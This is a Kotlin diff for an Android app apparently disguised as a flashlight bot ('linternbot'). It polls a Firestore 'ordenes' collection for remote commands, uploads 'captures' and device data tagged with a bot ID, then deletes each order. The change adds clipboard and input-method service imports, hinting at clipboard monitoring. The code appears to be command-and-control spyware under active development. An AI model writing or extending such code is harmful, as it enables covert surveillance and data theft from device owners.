@@ -3,11 +3,15 @@ package com.linternbot
 import android.app.AlarmManager
 import android.app.PendingIntent
 import android.content.BroadcastReceiver
+import android.content.ClipboardManager
 import android.content.Context
+import android.content.Context.CLIPBOARD_SERVICE
+import android.content.Context.INPUT_METHOD_SERVICE
 import android.content.Intent
 import android.os.Build
 import android.os.PowerManager
 import android.util.Log
+import android.view.inputmethod.InputMethodManager
 import android.widget.Toast
 import com.google.firebase.firestore.DocumentChange
 import com.google.firebase.firestore.FirebaseFirestore
@@ -65,14 +69,14 @@ class Alarm : BroadcastReceiver() {
                         nuevaCaptura(db, strDate)
                         Log.d("TAG2", "Se añade nueva captura")
                         db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
-                            Log.d("TAG2", "Documento eliminado")
+                            Log.d("TAG2", "Orden de captura eliminada")
                         }
                     }
                     if(document.data["Primitiva"]!!.equals("DATOSDISPOSITIVO")){
                         nuevosDatosDispositivo(db, strDate)
                         Log.d("TAG2", "Se añade nuevos datos del dispositivo")
                         db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
-                            Log.d("TAG2", "Documento eliminado")
+                            Log.d("TAG2", "Orden de datos de dispositivo eliminada")
                         }
                     }
                 }
@@ -94,10 +98,6 @@ class Alarm : BroadcastReceiver() {
     }
 
     fun nuevaCaptura(db : FirebaseFirestore, strDate: String){
-        val user = hashMapOf(
-            "Bot ID" to idAndroid,
-            "Hora" to strDate
-        )
 
         val captura = hashMapOf(
             "Bot ID" to idAndroid,
